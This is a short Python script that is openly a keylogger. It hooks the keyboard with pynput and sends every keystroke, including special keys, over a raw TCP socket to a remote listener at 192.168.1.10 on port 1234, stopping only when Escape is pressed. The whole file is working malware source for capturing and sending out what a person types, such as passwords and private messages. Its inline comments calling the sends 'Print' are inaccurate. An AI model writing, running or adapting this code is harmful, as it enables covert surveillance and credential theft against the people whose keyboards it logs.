from pynput import keyboard
from pathlib import Path
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect( ("192.168.1.10", 1234) )

def on_key_press(key):
    try:
        if key == keyboard.Key.esc:
            s.send(bytes("\nExiting keylogger...\n", "utf-8"))  # Print the key pressed
            return False  # Stop listener
        else:
            s.send(bytes(key.char, "utf-8"))  # Print the key pressed
            s.send(bytes(" " , "utf-8"))
    except AttributeError:
        s.send(bytes(str(key), "utf-8"))  # Print special keys
        s.send(bytes(" ", "utf-8"))
        
# Collect events until released
with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()  # Wait for the listener to finish
